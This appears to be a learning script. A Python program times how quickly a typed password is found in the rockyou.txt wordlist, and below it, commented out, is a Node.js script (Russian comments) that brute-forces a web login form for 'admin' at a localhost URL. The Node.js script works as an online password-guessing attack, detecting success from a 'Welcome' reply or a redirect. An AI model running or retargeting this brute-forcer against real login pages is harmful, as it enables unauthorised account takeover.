import os
import time

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DICTIONARY_FILE = os.path.abspath(os.path.join(BASE_DIR, "..", "..", "rockyou.txt"))

if not os.path.exists(DICTIONARY_FILE):
    print(f"[ERROR] Dictionary file not found at: {DICTIONARY_FILE}")
    print("[INFO] Please place 'rockyou.txt' in the correct folder or update DICTIONARY_FILE path in the code.")
    exit(1)

target_password = input("Enter a password for brute-force simulation: ")

print("\nLoading dictionary and starting the attack...\n")
start_time = time.time()

found = False
count = 0

with open(DICTIONARY_FILE, "r", encoding="utf-8", errors="ignore") as file:
    for line in file:
        count += 1
        guess = line.strip()
        
        if count % 50000 == 0:
            print(f"\rPasswords checked: {count}... Current: {guess}", end="", flush=True)
            
        if guess == target_password:
            end_time = time.time()
            print("\n" + "="*40)
            print(f"Password cracked: {guess}")
            print(f"Dictionary position: #{count}")
            print(f"Time elapsed: {round(end_time - start_time, 2)} seconds")
            print("="*40)
            found = True
            break

if not found:
    end_time = time.time()
    print(f"\nPassword not found in the dictionary. Total lines checked: {count}")
    print(f"Search time: {round(end_time - start_time, 2)} seconds")















""" import fs from 'fs';
import readline from 'readline';
import axios from 'axios';

// Настройки цели
const TARGET_URL = 'http://localhost:3000/login'; // Адрес тестовой формы входа
const USERNAME = 'admin';                         // Логин, который брутим
const DICTIONARY_FILE = '../rockyou.txt';            // Твой словарь на 14 млн строк

async function startWebBrute() {
  console.log(`🚀 Начинаю веб-брутфорс для пользователя: ${USERNAME}`);

  // Создаем интерфейс для построчного чтения огромного файла без забивания памяти
  const fileStream = fs.createReadStream(DICTIONARY_FILE);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });

  let count = 0;

  // Цикл "for await" последовательно берет каждую строчку из rockyou.txt
  for await (const line of rl) {
    count++;
    const password = line.trim(); // Убираем лишние пробелы и переносы строк

    // Каждые 5000 запросов выводим статус в консоль
    if (count % 5000 === 0) {
      console.log(`Проверено вариантов: ${count}... Текущий: ${password}`);
    }

    try {
      // Имитируем отправку формы входа (POST-запрос)
      const response = await axios.post(TARGET_URL, {
        username: USERNAME,
        password: password
      }, { 
        timeout: 2000,             // Если сайт завис, ждем максимум 2 секунды
        validateStatus: () => true // Не падаем в ошибку, если сайт ответил "Неверный пароль" (401/403)
      });

      // ЛОГИКА ПРОВЕРКИ: как понять, что пароль подошел?
      // Обычно успешный вход перенаправляет на другую страницу (dashboard) 
      // или в тексте ответа появляется слово "Welcome", "Success" или токен доступа.
      if (response.data.includes('Welcome') || response.status === 302) {
        console.log('\n' + '='.repeat(40));
        console.log(`ПАРОЛЬ ПОДОШЕЛ: ${password}`);
        console.log(`Проверено запросов: ${count}`);
        console.log('='.repeat(40));
        
        rl.close(); // Закрываем файл
        fileStream.destroy(); // Уничтожаем поток чтения
        return; // Выходим из программы
      }

    } catch (error) {
      console.error(`\nОшибка сети на попытке ${count} (${password}): ${error.message}`);
      // Если сайт упал от нагрузки, можно сделать паузу, но мы просто идем дальше
      continue; 
    }
  }

  console.log('\nПеребор окончен. Пароль не найден в словаре.');
}

startWebBrute();
 """